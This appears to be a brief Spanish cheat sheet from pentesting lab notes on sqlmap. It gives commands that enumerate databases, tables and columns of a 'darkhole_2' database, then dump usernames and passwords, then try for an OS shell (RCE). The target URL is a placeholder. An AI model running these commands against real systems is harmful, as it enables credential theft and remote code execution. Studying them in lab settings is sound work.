Sintaxis simple

```bash
sqlmap -u 'https://google.com?id=1' --dbs --cookie "PHPSESSID=12345" --dbms mysql --batch
```

![Screenshot](../../Images/sqlmap1.png)

```bash
sqlmap -u 'https://google.com?id=1' --cookie "PHPSESSID=12345" --dbms mysql --batch -D darkhole_2 --tables
```

![Screenshot](../../Images/sqlmap2.png)

```bash
sqlmap -u 'https://google.com?id=1' --cookie "PHPSESSID=12345" --dbms mysql --batch -D darkhole_2 -T users --columns
```

![Screenshot](../../Images/sqlmap3.png)

```bash
sqlmap -u 'https://google.com?id=1' --cookie "PHPSESSID=12345" --dbms mysql --batch -D darkhole_2 -T users -C username,password --dump
```

![Screenshot](../../Images/sqlmap4.png)

```bash
sqlmap -u 'https://google.com?id=1' --cookie "PHPSESSID=12345" --os-shell --batch
```

Intenta crear RCE
